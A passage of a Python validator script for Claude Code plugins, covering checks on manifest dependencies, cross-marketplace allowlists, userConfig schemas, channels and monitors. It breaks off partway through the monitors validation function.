#!/usr/bin/env python3
"""
Claude Code Plugin Validator

Comprehensive validation suite for Claude Code plugins.
Validates structure, manifest, hooks, skills, scripts, MCP servers, and
since v2.65.0 the whole-repo lint pass via `cpv_lint_engine.lint_repo`
(15 languages, gitignore-aware, uvx/bunx/docker fallback for tool
resolution — strict-by-default missing-tool detection).

Usage:
    uv run python scripts/validate_plugin.py /path/to/plugin
    uv run python scripts/validate_plugin.py --verbose
    uv run python scripts/validate_plugin.py --json
    uv run python scripts/validate_plugin.py --marketplace-only
    uv run python scripts/validate_plugin.py --skip-platform-checks windows

Flags:
    --marketplace-only: Skip plugin.json requirement for marketplace-only
                        distribution (strict=false). When using strict=false,
                        plugin.json should NOT exist (causes CLI issues).

    --skip-platform-checks: Skip platform-specific checks.
                        Valid platforms: windows, macos, linux
                        Use without args to skip all platform checks.
                        Example: --skip-platform-checks windows
                        Example: --skip-platform-checks (skips all)

Exit codes:
    0 - All checks passed (or only INFO/PASSED/WARNING/NIT)
    1 - CRITICAL issues found
    2 - MAJOR issues found
    3 - MINOR issues found
    4 - NIT issues found (--strict mode only)
"""

from __future__ import annotations

import argparse
import difflib
import fnmatch
import glob as _glob
import json
import os
import platform
import re
import shlex
import subprocess
import sys
from pathlib import Path
from typing import Any, cast

import yaml
from cpv_dependency_schema import validate_dependency_element
from cpv_lint_engine import lint_repo as run_lint_engine
from cpv_validation_common import (
    COLORS,
    ValidationReport,
    check_remote_execution_guard,
    gitignored_unshipped_paths,
    is_vendored_path,
    load_cpv_config,
    path_is_unshipped,
    removed_cpv_size_keys_present,
    save_report_and_print_summary,
    tracked_but_gitignored_paths,
    validate_component_name,
    validate_md_file_paths,
    validate_md_urls,
    validate_no_absolute_paths,
    validate_toc_embedding,
)
from detect_language import detect_languages
from detect_lockfiles import detect_lockfiles
from gitignore_filter import GitignoreFilter
from validate_agent import validate_agent as validate_agent_full
from validate_command import validate_command as validate_command_full
from validate_documentation import validate_documentation as validate_documentation_full
from validate_encoding import validate_encoding as validate_encoding_full
from validate_hook import (
    validate_hooks as validate_hook_file,
)
from validate_hook_precedence import validate_hook_precedence as validate_hook_precedence_file
from validate_lsp import validate_plugin_lsp
from validate_mcp import validate_plugin_mcp
from validate_rules import validate_rules_directory

# Import comprehensive skill validator (190+ rules from AgentSkills OpenSpec, Nixtla, Meta-Skills)
from validate_skill_comprehensive import validate_skill as validate_skill_comprehensive

IS_WINDOWS = platform.system() == "Windows"

# Module-level gitignore filter — initialized in main(), used by scan functions
_gi: GitignoreFilter | None = None


# Plugin-name pattern (kebab-case) — mirrors cpv_validation_common.NAME_PATTERN but
# expressed here as a local regex so dependency + channel validators don't reach out.
_PLUGIN_NAME_RE = re.compile(r"^[a-z][a-z0-9]*(-[a-z0-9]+)*$")

# Identifier pattern for userConfig keys — Python-style identifier.
_IDENTIFIER_RE = re.compile(r"^[a-zA-Z_][a-zA-Z0-9_]*$")

# Monitor `when` pattern — "always" or "on-skill-invoke:<kebab-skill-name>".
_MONITOR_WHEN_RE = re.compile(r"^always$|^on-skill-invoke:[a-z0-9-]+$")

# Dependency semver-RANGE validation lives in the shared SSOT module
# cpv_dependency_schema (is_valid_semver_range), imported via
# validate_dependency_element above — so validate_plugin and validate_marketplace
# share one copy (issue #106). The plugin's OWN exact-version regex below is a
# separate concern and stays here.

# Exact semver for a plugin's OWN `version` (semver.org §2): full
# MAJOR.MINOR.PATCH, no leading zeros, optional -prerelease / +build, FULLY
# anchored. Unlike the dependency-RANGE check (cpv_dependency_schema), a plugin
# version is a single concrete version, not a range — `re.match(r"^\d+\.\d+\.\d+", v)`
# (no `$`) wrongly accepted trailing garbage ("1.2.3foo"), extra components
# ("1.2.3.4"), and leading zeros ("01.02.03"), all of which break the
# version-bump / publish tooling that consumes this field.
_PLUGIN_VERSION_RE = re.compile(
    r"^(?:0|[1-9]\d*)\.(?:0|[1-9]\d*)\.(?:0|[1-9]\d*)"
    r"(?:-[0-9A-Za-z.-]+)?(?:\+[0-9A-Za-z.-]+)?$"
)


def _path_has_traversal(path: object) -> bool:
    """Return True when ``path`` contains a `..` path segment.

    Accepts ``object`` (not just ``str``) because callers pass values parsed
    from untrusted ``marketplace.json`` where the field is not guaranteed to
    be a string. Non-str inputs are treated as "no traversal". Splits on both
    ``/`` and ``\\`` so Windows-style paths are caught too.
    """
    if not isinstance(path, str):
        return False
    parts = re.split(r"[\\/]+", path)
    return any(p == ".." for p in parts)


def _safe_load_marketplace_json(path: Path) -> dict[str, Any] | None:
    """Read+parse a ``marketplace.json`` file. Returns None on any error.

    Used by ``discover_hosting_marketplace`` so a malformed marketplace.json
    on the filesystem never crashes the plugin validator — it just falls
    back to the no-context INFO behaviour. Validation of the marketplace
    file itself is the marketplace-validator's job, not the plugin
    validator's.
    """
    try:
        if not path.is_file():
            return None
        text = path.read_text(encoding="utf-8")
    except (OSError, UnicodeDecodeError):
        return None
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        return None
    return data if isinstance(data, dict) else None


def discover_hosting_marketplace(plugin_root: Path) -> dict[str, Any] | None:
    """Auto-discover the hosting marketplace.json for a plugin on disk.

    Returns the parsed marketplace.json dict (or ``None`` when no hosting
    marketplace is on the filesystem). The result is suitable to pass as the
    ``hosting_marketplace=`` kwarg on ``validate_manifest`` /
    ``validate_dependencies``.

    Discovery order (first match wins — Layout C beats Layout B beats cache):

      1. **Layout C — marketplace-in-plugin.** Plugin's own
         ``.claude-plugin/marketplace.json`` exists at ``plugin_root``.
      2. **Layout B — nested monorepo.** Walk up at most 3 parents looking
         for ``<parent>/.claude-plugin/marketplace.json``. (3 is enough to
         cover ``<mkt>/plugins/<name>/`` and one extra for safety while
         keeping the walk bounded.)
      3. **Cache layout.** ``~/.claude/plugins/cache/<mkt>/<plugin>/`` —
         the immediate parent's ``.claude-plugin/marketplace.json``. This
         is the dominant deployment shape after ``claude plugin install``.

    On a malformed marketplace.json the function returns None rather than
    raising — that surface is owned by ``validate_marketplace.py`` and the
    plugin validator must not crash on a sibling's bad JSON.
    """
    plugin_root = Path(plugin_root)

    # 1. Layout C — self-marketplace
    self_mkt = plugin_root / ".claude-plugin" / "marketplace.json"
    layout_c = _safe_load_marketplace_json(self_mkt)
    if layout_c is not None:
        return layout_c

    # 2. Layout B — walk up looking for a parent .claude-plugin/marketplace.json.
    #    Bound the walk to 3 levels so we don't scan the entire filesystem
    #    for an arbitrarily-deep nesting.
    seen: set[Path] = set()
    parent = plugin_root.parent
    for _ in range(3):
        if parent in seen or parent == parent.parent:
            break
        seen.add(parent)
        parent_mkt = parent / ".claude-plugin" / "marketplace.json"
        layout_b = _safe_load_marketplace_json(parent_mkt)
        if layout_b is not None:
            return layout_b
        parent = parent.parent

    # 3. Cache layout — ~/.claude/plugins/cache/<mkt>/<plugin>/.
    #    Already covered by step 2 when the parent has .claude-plugin/marketplace.json.
    #    Some cache layouts put marketplace.json directly at the cache-mkt root
    #    (no .claude-plugin/ wrapper). Try that fallback too.
    direct_parent_mkt = plugin_root.parent / "marketplace.json"
    return _safe_load_marketplace_json(direct_parent_mkt)


def validate_dependencies(
    manifest: dict[str, Any],
    report: ValidationReport,
    hosting_marketplace: dict[str, Any] | None = None,
) -> None:
    """Validate the ``dependencies`` array per plugin-dependencies.md:29-67.

    Each entry is either:
      * a bare string (plugin name only), or
      * a dict ``{name, version?, marketplace?}``.

    ``name`` is required and must match the plugin kebab-case name pattern.
    ``version`` is optional and must parse as a syntactic semver range.
    ``marketplace`` is optional and must also match the name pattern.
    Extra unknown sub-keys produce a MINOR finding so consumers notice.

    ``hosting_marketplace`` (TRDD-20108ab7, v2.22.3) is the parsed
    ``marketplace.json`` of the marketplace hosting the plugin under
    validation. When supplied, cross-marketplace dependency references are
    checked against the marketplace's ``allowCrossMarketplaceDependenciesOn``
    allowlist (per plugin-dependencies.md:54-79 — the canonical spec field
    name). The dict MUST contain a ``name`` key identifying the hosting
    marketplace; the allowlist is read from
    ``hosting_marketplace["allowCrossMarketplaceDependenciesOn"]`` (optional,
    defaults to empty allowlist). Pass ``None`` to skip cross-marketplace
    allowlist checks (e.g. when validating a plugin in isolation without
    marketplace context) — in that case an INFO is emitted per cross-dep.

    Backward-compat: an earlier CPV release used the non-spec name
    ``allowedDependencyMarketplaces``. Plugins that still ship that key
    are honoured as a fallback (with a NIT nudge to rename to the spec
    field).
    """
    if "dependencies" not in manifest:
        return
    deps = manifest["dependencies"]
    if not isinstance(deps, list):
        report.major(
            f"'dependencies' must be an array, got {type(deps).__name__} (plugin-dependencies.md:29)",
            ".claude-plugin/plugin.json",
        )
        return
    # Resolve hosting-marketplace context (TRDD-20108ab7).
    hosting_name: str | None = None
    hosting_allowlist: list[str] | None = None
    if isinstance(hosting_marketplace, dict):
        raw_name = hosting_marketplace.get("name")
        if isinstance(raw_name, str) and raw_name:
            hosting_name = raw_name
        # Spec name (plugin-dependencies.md): allowCrossMarketplaceDependenciesOn.
        # Fall back to the legacy name allowedDependencyMarketplaces only when
        # the spec name is absent — emit a NIT so authors rename to the spec.
        raw_allow = hosting_marketplace.get("allowCrossMarketplaceDependenciesOn")
        if raw_allow is None:
            raw_allow_legacy = hosting_marketplace.get("allowedDependencyMarketplaces")
            if raw_allow_legacy is not None:
                report.nit(
                    "marketplace.json uses legacy 'allowedDependencyMarketplaces' — "
                    "rename to the spec field 'allowCrossMarketplaceDependenciesOn' "
                    "(plugin-dependencies.md:54-79). Both names are honoured but the "
                    "legacy alias is removed in a future release.",
                    ".claude-plugin/marketplace.json",
                )
                raw_allow = raw_allow_legacy
        if isinstance(raw_allow, list):
            # Keep only string items — bad items are the marketplace validator's job.
            hosting_allowlist = [x for x in raw_allow if isinstance(x, str) and x]
    for i, entry in enumerate(deps):
        # Schema checks (string-or-object, kebab name, semver range, marketplace
        # FORMAT, unknown sub-keys) come from the shared SSOT helper so
        # validate_marketplace validates the SAME dependency-element shape
        # (issue #106). The helper is report-agnostic — emit each finding on
        # this report at its returned severity.
        for level, message in validate_dependency_element(i, entry):
            if level == "MAJOR":
                report.major(message, ".claude-plugin/plugin.json")
            elif level == "WARNING":
                report.warning(message, ".claude-plugin/plugin.json")
            elif level == "MINOR":
                report.minor(message, ".claude-plugin/plugin.json")
        # Cross-marketplace allowlist enforcement (TRDD-20108ab7) is NOT part of
        # the shared element schema — it needs the hosting-marketplace context
        # and is a plugin-only concern, so it stays inline here. Runs only when
        # the dep is a well-formed object with a syntactically-valid
        # `marketplace` name (the helper above already flagged a bad format).
        if (
            isinstance(entry, dict)
            and isinstance(entry.get("marketplace"), str)
            and _PLUGIN_NAME_RE.match(entry["marketplace"])
        ):
            market = entry["marketplace"]
            # When a dep declares a DIFFERENT marketplace from the hosting one,
            # the target MUST appear in the hosting marketplace's
            # `allowCrossMarketplaceDependenciesOn` list — otherwise the
            # dependency is blocked at install time.
            if hosting_marketplace is None:
                # Validating in isolation — informational only.
                report.info(
                    f"'dependencies[{i}].marketplace' = '{market}' is a cross-marketplace "
                    "reference; allowlist check skipped (no hosting marketplace context)",
                    ".claude-plugin/plugin.json",
                )
            elif hosting_name is None:
                # A hosting marketplace WAS supplied/discovered but it has no
                # usable `name` — the cross-marketplace allowlist is keyed on
                # the hosting name, so the check below cannot run. Without
                # this branch the enforcement was silently skipped (a
                # malformed marketplace.json bypassing the install-blocking
                # check). Surface it as INFO so the gap is visible; the
                # missing `name` itself is the marketplace validator's hard
                # error to report, not the plugin's.
                report.info(
                    f"'dependencies[{i}].marketplace' = '{market}' is a cross-marketplace "
                    "reference, but the hosting marketplace.json has no usable 'name' — "
                    "allowlist check skipped. Fix the hosting marketplace.json's 'name' "
                    "so cross-marketplace dependencies can be enforced.",
                    ".claude-plugin/plugin.json",
                )
            elif market != hosting_name:
                if hosting_allowlist is None or market not in hosting_allowlist:
                    allow_desc = sorted(hosting_allowlist) if hosting_allowlist is not None else "<none declared>"
                    report.major(
                        f"'dependencies[{i}].marketplace' = '{market}' is not in the hosting "
                        f"marketplace's allowCrossMarketplaceDependenciesOn allowlist "
                        f"({allow_desc}) — cross-marketplace dependency is blocked at install time "
                        "with a 'cross-marketplace' error (plugin-dependencies.md:54-79). Add "
                        f"'{market}' to the root marketplace.json's "
                        "allowCrossMarketplaceDependenciesOn array OR remove the marketplace field.",
                        ".claude-plugin/plugin.json",
                    )
                else:
                    report.passed(
                        f"'dependencies[{i}].marketplace' = '{market}' allowlisted "
                        "for cross-marketplace resolution",
                        ".claude-plugin/plugin.json",
                    )
    if deps:
        report.passed(f"'dependencies' schema valid: {len(deps)} entry(ies)", ".claude-plugin/plugin.json")


# v2.1.121 — userConfig per-key `type` enum (5 values).
USER_CONFIG_TYPE_ENUM = frozenset({"string", "number", "boolean", "directory", "file"})

# Maps each userConfig `type` to the Python type(s) a `default` value may hold.
# directory/file are path strings. bool is handled specially for "number" (a
# bool is a subclass of int but is NOT a valid numeric default).
USER_CONFIG_TYPE_TO_PYTHON: dict[str, tuple[type, ...]] = {
    "string": (str,),
    "number": (int, float),
    "boolean": (bool,),
    "directory": (str,),
    "file": (str,),
}


def validate_user_config_structure(manifest: dict[str, Any], report: ValidationReport) -> None:
    """Validate the ``userConfig`` root per plugins-reference.md (v2.1.121).

    Per-key fields:
      Required: type, title, description
      Optional: sensitive, required, default, multiple, min, max
    Type enum: string | number | boolean | directory | file

    Keys must be valid identifiers (CLAUDE_PLUGIN_OPTION_<KEY> env-var derivation).
    """
    if "userConfig" not in manifest:
        return
    uc = manifest["userConfig"]
    if not isinstance(uc, dict):
        # This helper is the single source of truth for userConfig (the inline
        # block in validate_manifest was removed in v2.106 to stop double-counting
        # — the duplicate findings inflated the MAJOR count). It must therefore
        # emit the non-dict MAJOR itself.
        report.major(
            f"'userConfig' must be an object, got {type(uc).__name__}",
            ".claude-plugin/plugin.json",
        )
        return
    # v2.1.121 spec — full sub-field set (9 fields total).
    known_sub = frozenset(
        {
            "type",
            "title",
            "description",
            "sensitive",
            "required",
            "default",
            "multiple",
            "min",
            "max",
        }
    )
    required_sub = frozenset({"type", "title", "description"})
    for key, entry in uc.items():
        if not isinstance(key, str) or not _IDENTIFIER_RE.match(key):
            report.major(
                f"'userConfig.{key}' key must be a valid identifier — needed for the "
                "CLAUDE_PLUGIN_OPTION_<KEY> env-var export",
                ".claude-plugin/plugin.json",
            )
            continue
        if not isinstance(entry, dict):
            # SSOT: emit the non-dict-entry MAJOR here (the inline block that
            # used to own it was removed in v2.106 to stop double-counting).
            report.major(
                f"'userConfig.{key}' must be an object with 'title' and 'type', got {type(entry).__name__}",
                ".claude-plugin/plugin.json",
            )
            continue

        # v2.1.121 — required sub-fields.
        for req in required_sub:
            if req not in entry:
                report.major(
                    f"'userConfig.{key}' missing required sub-field '{req}' (spec requires type, title, description)",
                    ".claude-plugin/plugin.json",
                )

        # type — enum validation.
        if "type" in entry:
            t = entry["type"]
            if not isinstance(t, str):
                report.major(
                    f"'userConfig.{key}.type' must be a string, got {type(t).__name__}",
                    ".claude-plugin/plugin.json",
                )
            elif t not in USER_CONFIG_TYPE_ENUM:
                report.major(
                    f"'userConfig.{key}.type' = {t!r} is not a valid type "
                    f"(expected one of: {sorted(USER_CONFIG_TYPE_ENUM)})",
                    ".claude-plugin/plugin.json",
                )

        # title — must be a non-empty string.
        if "title" in entry:
            title = entry["title"]
            if not isinstance(title, str) or not title.strip():
                report.major(
                    f"'userConfig.{key}.title' must be a non-empty string",
                    ".claude-plugin/plugin.json",
                )

        # description — REQUIRED per spec (plugins-reference.md:473, "Required: Yes");
        # its presence is enforced by the `required_sub` loop above (which emits the
        # missing-sub-field MAJOR). This block only adds the type check when present.
        if "description" in entry and not isinstance(entry["description"], str):
            report.major(
                f"'userConfig.{key}.description' must be a string, got {type(entry['description']).__name__}",
                ".claude-plugin/plugin.json",
            )

        # sensitive / required / multiple — boolean.
        for bool_field in ("sensitive", "required", "multiple"):
            if bool_field in entry and not isinstance(entry[bool_field], bool):
                report.major(
                    f"'userConfig.{key}.{bool_field}' must be a boolean, got {type(entry[bool_field]).__name__}",
                    ".claude-plugin/plugin.json",
                )

        # min / max — only meaningful for type: number.
        for num_field in ("min", "max"):
            if num_field in entry:
                v = entry[num_field]
                if not isinstance(v, (int, float)) or isinstance(v, bool):
                    report.major(
                        f"'userConfig.{key}.{num_field}' must be a number, got {type(v).__name__}",
                        ".claude-plugin/plugin.json",
                    )
                elif entry.get("type") not in (None, "number"):
                    report.minor(
                        f"'userConfig.{key}.{num_field}' set on non-number type "
                        f"({entry.get('type')!r}) — only meaningful for type: number",
                        ".claude-plugin/plugin.json",
                    )

        # multiple is only meaningful for type: string per spec.
        if entry.get("multiple") is True and entry.get("type") not in (None, "string"):
            report.minor(
                f"'userConfig.{key}.multiple' set on non-string type "
                f"({entry.get('type')!r}) — only meaningful for type: string",
                ".claude-plugin/plugin.json",
            )

        # default/type-match — when BOTH a valid type and a default are present
        # their runtime types must agree (the inline block that used to own this
        # check was removed in v2.106). bool is a subclass of int, so exclude it
        # when the declared type is "number".
        declared = entry.get("type")
        if "default" in entry and isinstance(declared, str) and declared in USER_CONFIG_TYPE_ENUM:
            expected_py_types = USER_CONFIG_TYPE_TO_PYTHON.get(declared, ())
            default_value = entry["default"]
            is_match = isinstance(default_value, expected_py_types)
            if declared == "number" and isinstance(default_value, bool):
                is_match = False
            if not is_match:
                report.major(
                    f"'userConfig.{key}.default' type ({type(default_value).__name__}) "
                    f"does not match declared type ({declared})",
                    ".claude-plugin/plugin.json",
                )

        # Unknown sub-fields — MINOR so authors notice typos.
        for extra in set(entry.keys()) - known_sub:
            report.minor(
                f"'userConfig.{key}.{extra}' is not a recognized sub-field (recognized: {sorted(known_sub)})",
                ".claude-plugin/plugin.json",
            )


_PLUGIN_ROOT_DIR_PATTERN = re.compile(r"\$\{?CLAUDE_PLUGIN_ROOT\}?[/\\]+([A-Za-z0-9_.\-]+)[/\\]")


def _extract_referenced_dirs_from_text(text: str) -> set[str]:
    """Find folder names referenced as `${CLAUDE_PLUGIN_ROOT}/<dir>/...` in text.

    Returns the lowercase set of distinct first-level folder names found. Used to
    discover plugin-bundled folders that the manifest legitimately uses, so the
    "non-standard directory" warning doesn't false-positive on e.g. `mcp-server/`
    when `.mcp.json` has `"command": "node", "args": ["${CLAUDE_PLUGIN_ROOT}/mcp-server/index.js"]`.
    """
    return {m.group(1).lower() for m in _PLUGIN_ROOT_DIR_PATTERN.finditer(text)}


def _walk_for_command_args(node: Any) -> list[str]:
    """Recursively collect string values from `command` / `url` / `args` / `env` keys.

    `command` and `url` contribute their string value; `args` contributes its
    string list items; `env` contributes its dict's string values. Used to
    discover plugin-bundled folders referenced from the manifest.
    """
    out: list[str] = []
    if isinstance(node, dict):
        for k, v in node.items():
            if k in ("command", "url") and isinstance(v, str):
                out.append(v)
            elif k == "args" and isinstance(v, list):
                out.extend(s for s in v if isinstance(s, str))
            elif k == "env" and isinstance(v, dict):
                out.extend(s for s in v.values() if isinstance(s, str))
            else:
                out.extend(_walk_for_command_args(v))
    elif isinstance(node, list):
        for item in node:
            out.extend(_walk_for_command_args(item))
    return out


def _collect_manifest_referenced_dirs(plugin_root: Path) -> set[str]:
    """Discover plugin-bundled folders referenced from the manifest.

    Scans .mcp.json, .lsp.json, hooks/hooks.json, monitors/monitors.json, and
    plugin.json's inline mcpServers/lspServers/hooks/monitors fields for
    `${CLAUDE_PLUGIN_ROOT}/<dirname>/...` patterns. Returns the lowercase set of
    distinct first-level folder names found. Failures (missing file, malformed
    JSON, etc.) are silently ignored — this is a hint generator, not a validator.
    """
    referenced: set[str] = set()

    def _safe_load(p: Path) -> Any:
        if not p.exists():
            return None
        try:
            return json.loads(p.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            return None

    # Standard root-level config files
    for cfg_path in (
        plugin_root / ".mcp.json",
        plugin_root / ".lsp.json",
        plugin_root / "hooks" / "hooks.json",
        plugin_root / "monitors" / "monitors.json",
    ):
        data = _safe_load(cfg_path)
        if data is not None:
            for s in _walk_for_command_args(data):
                referenced |= _extract_referenced_dirs_from_text(s)

    # Inline plugin.json fields (mcpServers / lspServers / hooks / monitors)
    manifest = _safe_load(plugin_root / ".claude-plugin" / "plugin.json")
    if isinstance(manifest, dict):
        for field in ("mcpServers", "lspServers", "hooks", "monitors", "channels"):
            value = manifest.get(field)
            if value is None:
                continue
            # Three mutually-exclusive shapes (audit NIT lsp #8 — the old
            # `if (dict,list)` + `if str` + `elif list` double-processed a list
            # and read as dead code):
            #   dict → inline object, walk directly
            #   str  → path reference, load the file and walk it
            #   list → array of EITHER inline objects OR path-string references
            if isinstance(value, dict):
                for s in _walk_for_command_args(value):
                    referenced |= _extract_referenced_dirs_from_text(s)
            elif isinstance(value, str):
                ref_path = value[2:] if value.startswith("./") else value
                ref_file = plugin_root / ref_path
                ref_data = _safe_load(ref_file)
                if ref_data is not None:
                    for s in _walk_for_command_args(ref_data):
                        referenced |= _extract_referenced_dirs_from_text(s)
            elif isinstance(value, list):
                for entry in value:
                    if isinstance(entry, str):
                        ref_path = entry[2:] if entry.startswith("./") else entry
                        ref_file = plugin_root / ref_path
                        ref_data = _safe_load(ref_file)
                        if ref_data is not None:
                            for s in _walk_for_command_args(ref_data):
                                referenced |= _extract_referenced_dirs_from_text(s)
                    else:
                        for s in _walk_for_command_args(entry):
                            referenced |= _extract_referenced_dirs_from_text(s)

    return referenced


def _mcp_server_keys(manifest: dict[str, Any], plugin_root: Path) -> set[str] | None:
    """Resolve the set of declared MCP server names.

    Returns ``None`` when the set cannot be determined (e.g. ``mcpServers``
    is a path string that cannot be loaded) so callers can skip cross-ref
    checks rather than emit false-positive MAJORs.
    """
    if "mcpServers" not in manifest:
        return set()
    mcp = manifest["mcpServers"]
    if isinstance(mcp, dict):
        # Inline object — either {name: config, ...} directly, or the MCP-standard
        # wrapper shape {"mcpServers": {name: config, ...}}.
        if "mcpServers" in mcp and isinstance(mcp["mcpServers"], dict):
            return set(mcp["mcpServers"].keys())
        return set(mcp.keys())
    if isinstance(mcp, str):
        # Strip ONLY the literal "./" prefix — NOT a character-set strip.
        # `"./.mcp.json".lstrip("./")` is "mcp.json" (lstrip removes every
        # leading '.' and '/'), which mangles the standard `.mcp.json` dotfile
        # so `is_file()` fails, this returns None, and the channels validator
        # silently skips its server cross-reference (audit HIGH). The `[2:]`
        # slice idiom (already used at the inline-walk above) preserves the
        # leading dot of dotfile names.
        rel = mcp[2:] if mcp.startswith("./") else mcp
        mcp_path = (plugin_root / rel).resolve()
        if not mcp_path.is_file():
            return None
        try:
            data = json.loads(mcp_path.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            return None
        if isinstance(data, dict):
            if "mcpServers" in data and isinstance(data["mcpServers"], dict):
                return set(data["mcpServers"].keys())
            return set(data.keys())
        return None
    return None


def validate_channels_structure(manifest: dict[str, Any], plugin_root: Path, report: ValidationReport) -> None:
    """Validate the ``channels`` array per plugins-reference.md:438-455.

    Each entry is a dict with required ``server`` (string). ``server`` MUST
    match a key in the plugin's ``mcpServers``. ``mcpServers`` may be an
    inline dict or a path string pointing at an MCP config — when it's a path
    we try to resolve it from ``plugin_root``; if the file cannot be loaded
    we skip the cross-reference check rather than emit a false positive.

    The optional per-entry ``userConfig`` follows the same schema as the
    top-level one; we validate structure inline since the helper is scoped
    to the root manifest.
    """
    if "channels" not in manifest:
        return
    channels = manifest["channels"]
    if not isinstance(channels, list):
        report.major(
            f"'channels' must be an array, got {type(channels).__name__} (plugins-reference.md:438)",
            ".claude-plugin/plugin.json",
        )
        return
    mcp_keys = _mcp_server_keys(manifest, plugin_root)
    for i, entry in enumerate(channels):
        if not isinstance(entry, dict):
            report.major(
                f"'channels[{i}]' must be an object (plugins-reference.md:438-455)",
                ".claude-plugin/plugin.json",
            )
            continue
        # server — required + cross-reference
        if "server" not in entry:
            report.major(
                f"'channels[{i}]' missing required 'server' field (plugins-reference.md:438-455)",
                ".claude-plugin/plugin.json",
            )
        elif not isinstance(entry["server"], str):
            report.major(
                f"'channels[{i}].server' must be a string, got {type(entry['server']).__name__}",
                ".claude-plugin/plugin.json",
            )
        elif mcp_keys is not None and entry["server"] not in mcp_keys:
            # mcp_keys may be empty (no mcpServers declared) — still a MAJOR
            # because channels[].server MUST reference an existing MCP server.
            report.major(
                f"'channels[{i}].server' = '{entry['server']}' does not match any key in mcpServers "
                "(plugins-reference.md:438-455)",
                ".claude-plugin/plugin.json",
            )
        # per-channel userConfig — optional; reuse identifier + type checks.
        if "userConfig" in entry:
            cuc = entry["userConfig"]
            if not isinstance(cuc, dict):
                report.major(
                    f"'channels[{i}].userConfig' must be an object, got {type(cuc).__name__}",
                    ".claude-plugin/plugin.json",
                )
            else:
                for ck, cv in cuc.items():
                    if not isinstance(ck, str) or not _IDENTIFIER_RE.match(ck):
                        report.major(
                            f"'channels[{i}].userConfig.{ck}' key must be a valid identifier",
                            ".claude-plugin/plugin.json",
                        )
                    if isinstance(cv, dict):
                        if "description" in cv and not isinstance(cv["description"], str):
                            report.major(
                                f"'channels[{i}].userConfig.{ck}.description' must be a string",
                                ".claude-plugin/plugin.json",
                            )
                        if "sensitive" in cv and not isinstance(cv["sensitive"], bool):
                            report.major(
                                f"'channels[{i}].userConfig.{ck}.sensitive' must be a boolean",
                                ".claude-plugin/plugin.json",
                            )


def _read_skill_md_name(skill_md: Path) -> str | None:
    """Return the ``name`` frontmatter value of a SKILL.md file, or None.

    Fail-safe by design: any read or parse error yields None so skill
    discovery never crashes on a malformed file — the skill validator is
    the surface that reports the actual defect.
    """
    try:
        content = skill_md.read_text(encoding="utf-8")
    except OSError:
        return None
    if not content.startswith("---"):
        return None
    parts = content.split("---", 2)
    if len(parts) < 3:
        return None
    try:
        frontmatter = yaml.safe_load(parts[1])
    except yaml.YAMLError:
        return None
    if isinstance(frontmatter, dict):
        name = frontmatter.get("name")
        if isinstance(name, str) and name.strip():
            return name.strip()
    return None


def _discover_plugin_skills(plugin_root: Path) -> set[str]:
    """Return the set of skill names declared by this plugin.

    GAP-10 helper (v2.22.3): scans ``<plugin>/skills/<skill>/SKILL.md`` so
    the monitors validator can cross-reference ``on-skill-invoke:<skill>``
    targets against actually-declared skills.

    CC v2.1.142: when the plugin has no ``skills/`` subdirectory, a
    root-level ``SKILL.md`` is surfaced as a skill — its invocable name is
    the ``name`` frontmatter field, so it is included here too.
    """
    skills_dir = plugin_root / "skills"
    if not skills_dir.is_dir():
        root_skill_md = plugin_root / "SKILL.md"
        if root_skill_md.is_file():
            name = _read_skill_md_name(root_skill_md)
            if name:
                return {name}
        return set()
    discovered: set[str] = set()
    for entry in skills_dir.iterdir():
        if entry.is_dir() and (entry / "SKILL.md").is_file():
            discovered.add(entry.name)
    return discovered


def _validate_monitors_array(
    entries: list[Any],
    source_label: str,
    report: ValidationReport,
    declared_skills: set[str] | None = None,
) -> None:
    """Shared per-entry validator for monitors arrays (inline or external file).

    ``declared_skills`` is the set of skill names declared by the hosting plugin.
    When supplied, ``on-skill-invoke:<name>`` targets are cross-referenced
    against the declared set; a MINOR is emitted when the referenced skill
    does not exist (GAP-10). Pass ``None`` to skip the check (e.g. when the
    caller cannot determine the plugin root).
    """
    seen: set[str] = set()
    known = {"name", "command", "description", "when"}
    for i, entry in enumerate(entries):
        if not isinstance(entry, dict):
            report.major(
                f"monitors[{i}] must be an object (plugins-reference.md:268-318)",
                source_label,
            )
            continue
        # name — required + unique
        name = entry.get("name")
        if not isinstance(name, str) or not name:
            report.major(
                f"monitors[{i}] missing required 'name' field (plugins-reference.md:302-318)",
                source_label,
            )
        elif name in seen:
            report.major(
                f"monitors[{i}] duplicate 'name' = '{name}' — monitor names must be unique",
                source_label,
            )
        else:
            seen.add(name)
        # command — required
        if not isinstance(entry.get("command"), str) or not entry.get("command"):
            report.major(
                f"monitors[{i}] missing required 'command' field (plugins-reference.md:302-318)",
                source_label,
            )
        # description — required
        if not isinstance(entry.get("description"), str) or not entry.get("description"):
            report.major(
                f"monitors[{i}] missing required 'description' field (plugins-reference.md:302-318)",
                source_label,
            )
        # when — optional; must match "always" or "on-skill-invoke:<name>"
        if "when" in entry:
            when_val = entry["when"]
            if not isinstance(when_val, str) or not _MONITOR_WHEN_RE.match(when_val):
                report.major(
                    f"monitors[{i}].when = {when_val!r} must match 'always' or "
                    "'on-skill-invoke:<skill-name>' (plugins-reference.md:302-318)",
                    source_label,
                )
            elif declared_skills is not None and isinstance(when_val, str) and when_val.startswith("on-skill-invoke:"):
                # GAP-10 (v2.22.3): cross-reference the skill name against
                # declared skills. Empty declared_skills means the plugin
                # has no skills/ directory at all — still report so authors
                # notice the dangling reference.
                target = when_val.split(":", 1)[1]
                if target and target not in declared_skills:
                    report.minor(
                        f"monitors[{i}].when references unknown skill "
                        f"'{target}' — no skills/{target}/SKILL.md found "
                        "(plugins-reference.md:314)",
                        source_label,
                    )
        # unknown keys — MINOR
        if isinstance(entry, dict):
            for extra in set(entry.keys()) - known:
                report.minor(
                    f"monitors[{i}].{extra} is not a recognized monitor field "
                    "(recognized: name, command, description, when)",
                    source_label,
                )


def validate_monitors_entries(manifest: dict[str, Any], plugin_root: Path, report: ValidationReport) -> None:
    """Validate the ``monitors`` entries per plugins-reference.md:268-318.

    ``monitors`` may be inline in plugin.json OR a path string pointing at a
    ``monitors.json`` file. Either shape is an array of dicts requiring
    ``name`` (unique), ``command``, and ``description``. Optional ``when``
    must match the ``always``/``on-skill-invoke:<name>`` grammar.
    """
    if "monitors" not in manifest:
        return
    monitors = manifest["monitors"]
    declared_skills = _discover_plugin_skills(plugin_root)
    if isinstance(monitors, list):
        _validate_monitors_array(monitors, ".claude-plugin/plugin.json", report, declared_skills)
        return
    if isinstance(monitors, str):
